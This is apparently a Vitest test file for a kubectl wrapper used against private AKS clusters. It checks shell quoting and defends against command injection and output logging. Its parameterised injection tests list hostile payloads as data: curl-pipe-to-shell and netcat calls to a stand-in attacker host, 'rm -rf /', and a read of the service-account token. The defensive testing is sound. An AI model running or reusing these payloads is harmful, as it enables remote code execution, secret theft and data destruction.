import {vi} from 'vitest'
vi.mock('@actions/exec')
vi.mock('@actions/core')

import {execFileSync} from 'node:child_process'
import * as fileUtils from '../utilities/fileUtils.js'
import fs from 'node:fs'
import {
   PrivateKubectl,
   buildShellCommand,
   containsFilenames,
   extractFileNames,
   replaceFileNamesWithShallowNamesRelativeToTemp,
   shellQuote
} from './privatekubectl.js'
import * as exec from '@actions/exec'
import * as core from '@actions/core'

describe('Private kubectl', () => {
   const annotationPayload = `actions.github.com/k8s-deploy={"run":"3498366832","repository":"jaiveerk/k8s-deploy","workflow":"Minikube Integration Tests - private cluster","branch":"refs/heads/main","provider":"GitHub"}`

   // The argv form of what the action builds internally.
   const testArgs = [
      'kubectl',
      'annotate',
      '-f',
      '/tmp/testdir/test.yml,/tmp/test2.yml,/tmp/testdir/subdir/test3.yml',
      '-f',
      '/tmp/test4.yml',
      '--filename',
      '/tmp/test5.yml',
      annotationPayload,
      '--overwrite',
      '--namespace',
      'test-3498366832'
   ]

   const mockKube = new PrivateKubectl(
      'kubectlPath',
      'namespace',
      true,
      'resourceGroup',
      'resourceName'
   )

   vi.spyOn(fileUtils, 'getTempDirectory').mockImplementation(() => '/tmp')
   vi.spyOn(fs, 'writeFileSync').mockImplementation(() => {})
   vi.spyOn(fs, 'readFileSync').mockImplementation(() => 'test contents')

   it('should extract filenames correctly', () => {
      expect(extractFileNames(testArgs)).toEqual([
         '/tmp/testdir/test.yml',
         '/tmp/test2.yml',
         '/tmp/testdir/subdir/test3.yml',
         '/tmp/test4.yml',
         '/tmp/test5.yml'
      ])
   })

   it('should replace filenames with shallow names for relative locations in tmp correctly', () => {
      expect(replaceFileNamesWithShallowNamesRelativeToTemp(testArgs)).toEqual([
         'kubectl',
         'annotate',
         '-f',
         'testdir-test.yml,test2.yml,testdir-subdir-test3.yml',
         '-f',
         'test4.yml',
         '--filename',
         'test5.yml',
         annotationPayload,
         '--overwrite',
         '--namespace',
         'test-3498366832'
      ])
   })

   it('should not treat a value merely containing "-f " as a filename flag', () => {
      // containsFilenames() previously substring-matched the flattened
      // command, so an annotation or resource name containing "-f " triggered
      // filename rewriting and corrupted the command.
      const args = ['kubectl', 'annotate', 'deployment', 'my-f oo']
      expect(containsFilenames(args)).toBe(false)
      expect(extractFileNames(args)).toEqual([])
   })

   it('detects the --filename= inline form', () => {
      const args = ['kubectl', 'apply', '--filename=/tmp/a.yml']
      expect(containsFilenames(args)).toBe(true)
      expect(extractFileNames(args)).toEqual(['/tmp/a.yml'])
   })

   test('Should throw well defined Error on error from Azure', async () => {
      const errorMsg = 'An error message'
      vi.spyOn(exec, 'getExecOutput').mockImplementation(async () => {
         return {exitCode: 1, stdout: '', stderr: errorMsg}
      })

      await expect(mockKube.executeCommand('az', 'test')).rejects.toThrow(
         Error(
            `Call to private cluster failed. Command: 'kubectl az test --insecure-skip-tls-verify --namespace namespace', errormessage: ${errorMsg}`
         )
      )
   })
})

const azOk = {
   exitCode: 0,
   stdout: JSON.stringify({logs: 'ok', exitCode: 0}),
   stderr: ''
}

/** The string handed to `az aks command invoke --command`. */
function invokedCommand(callIndex = 0): string {
   const argv: string[] = (exec.getExecOutput as any).mock.calls[callIndex][1]
   const i = argv.indexOf('--command')
   expect(i).toBeGreaterThan(-1)
   return argv[i + 1]
}

/**
 * Runs the generated command in a real POSIX shell with `kubectl` stubbed to
 * dump its argv NUL-separated. This is the strongest available assertion that
 * quoting is correct: it proves the shell reconstructs exactly the argv we
 * started with, rather than merely that the string "looks escaped".
 */
function argvSeenByCluster(command: string): string[] {
   const script = `kubectl() { printf '%s\\0' "$@"; }; ${command}`
   const parts = execFileSync('sh', ['-c', script], {encoding: 'utf8'}).split(
      '\0'
   )
   if (parts[parts.length - 1] === '') parts.pop()
   return parts
}

describe('shellQuote', () => {
   it('leaves safe tokens unquoted for readability', () => {
      expect(shellQuote('kubectl')).toBe('kubectl')
      expect(shellQuote('--namespace')).toBe('--namespace')
      expect(shellQuote('/tmp/a_b.yml')).toBe('/tmp/a_b.yml')
   })

   it('quotes the empty string', () => {
      expect(shellQuote('')).toBe("''")
   })

   it('escapes embedded single quotes', () => {
      expect(shellQuote("it's")).toBe(`'it'\\''s'`)
   })
})

describe('PrivateKubectl command injection (CWE-78)', () => {
   const kubectl = new PrivateKubectl(
      'kubectl',
      'test-ns',
      false,
      'my-rg',
      'my-cluster'
   )

   beforeEach(() => {
      vi.spyOn(fs, 'readFileSync').mockImplementation(
         () => 'test contents' as any
      )
      vi.spyOn(fs, 'writeFileSync').mockImplementation(() => {})
      vi.spyOn(fs, 'existsSync').mockImplementation(() => true)
      vi.spyOn(exec, 'getExecOutput').mockImplementation(async () => azOk)
   })

   it('sends az an argv array, never a shell string', async () => {
      await kubectl.delete(['deployment', 'my-app'])
      const call = (exec.getExecOutput as any).mock.calls[0]
      expect(call[0]).toBe('az')
      expect(Array.isArray(call[1])).toBe(true)
   })

   it('produces a command the cluster shell parses back to the exact argv', async () => {
      await kubectl.delete(['deployment', 'my-app'])
      expect(argvSeenByCluster(invokedCommand())).toEqual([
         'delete',
         'deployment',
         'my-app',
         '--namespace',
         'test-ns'
      ])
   })

   it('quotes an annotation payload containing spaces, quotes and braces', async () => {
      // This unquoted JSON blob corrupted the remote command even in ordinary
      // use, and embeds GITHUB_WORKFLOW and the branch name.
      const annotation = `actions.github.com/k8s-deploy={"run":"1","workflow":"My Workflow","branch":"refs/heads/main"}`
      await kubectl.annotateFiles('/tmp/a.yml', annotation)

      expect(argvSeenByCluster(invokedCommand())).toEqual([
         'annotate',
         '-f',
         'a.yml',
         annotation,
         '--overwrite',
         '--namespace',
         'test-ns'
      ])
   })

   it.each([
      ';curl -s attacker.example.com | sh',
      '$(id)',
      '`id`',
      '&& rm -rf /',
      '| nc attacker.example.com 443',
      "'; id; #",
      '$IFS$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)',
      '> /tmp/pwned',
      'a\nb'
   ])(
      'neutralises shell payload %s in an annotation value',
      async (payload) => {
         const annotation = `actions.github.com/k8s-deploy={"branch":"${payload}"}`
         await kubectl.annotateFiles('/tmp/a.yml', annotation)

         const argv = argvSeenByCluster(invokedCommand())
         // The payload arrives as inert data inside a single argument.
         expect(argv[3]).toBe(annotation)
         // Exactly the arguments we intended, nothing more.
         expect(argv).toHaveLength(7)
      }
   )

   it.each([
      'x;curl attacker.example.com|sh',
      'x$(id)',
      'x`id`',
      '--as=system:masters'
   ])(
      'neutralises payload %s carried in a resource name',
      async (maliciousName) => {
         // Reaches the command string via manifest metadata.name, which flows
         // into delete/describe/annotate for canary and blue-green strategies.
         await kubectl.delete(['deployment', maliciousName])

         expect(argvSeenByCluster(invokedCommand())).toEqual([
            'delete',
            'deployment',
            maliciousName,
            '--namespace',
            'test-ns'
         ])
      }
   )

   it('neutralises a payload carried in the namespace', async () => {
      // Workflows commonly build this from github.head_ref, and git permits
      // ';', '$', '(', ')', '`', '|' and '&' in branch names.
      const badNs = 'pr-;curl$IFS-s$IFSattacker.example.com|sh;'
      const bad = new PrivateKubectl(
         'kubectl',
         badNs,
         false,
         'my-rg',
         'my-cluster'
      )
      await bad.delete(['deployment', 'my-app'])

      expect(argvSeenByCluster(invokedCommand())).toEqual([
         'delete',
         'deployment',
         'my-app',
         '--namespace',
         badNs
      ])
   })

   it('neutralises a payload carried in a manifest filename', async () => {
      // Temp manifest filenames are derived from metadata.name, and
      // path.basename() strips separators but not shell metacharacters.
      const badFile = '/tmp/Deployment_x;id;_1.yml'
      await kubectl.annotateFiles(badFile, 'k=v')

      const argv = argvSeenByCluster(invokedCommand())
      expect(argv[0]).toBe('annotate')
      expect(argv[1]).toBe('-f')
      expect(argv[2]).toBe('Deployment_x;id;_1.yml')
      expect(argv).toHaveLength(7)
   })

   it('does not expand the payload into extra shell words', async () => {
      const cmd = buildShellCommand(['kubectl', 'delete', 'a b;id;`id`'])
      expect(argvSeenByCluster(cmd)).toEqual(['delete', 'a b;id;`id`'])
   })

   it('honours silent and does not log command output (CWE-532)', async () => {
      const info = vi.spyOn(core, 'info').mockImplementation(() => {})
      vi.spyOn(exec, 'getExecOutput').mockImplementation(async () => ({
         exitCode: 0,
         stdout: JSON.stringify({
            logs: 'pod spec containing DB_PASSWORD=hunter2',
            exitCode: 0
         }),
         stderr: ''
      }))

      // getAllPods() requests silent output.
      await kubectl.getAllPods()
      expect(info).not.toHaveBeenCalled()

      // A non-silent command still surfaces its logs.
      await kubectl.delete(['deployment', 'my-app'])
      expect(info).toHaveBeenCalled()
   })
})
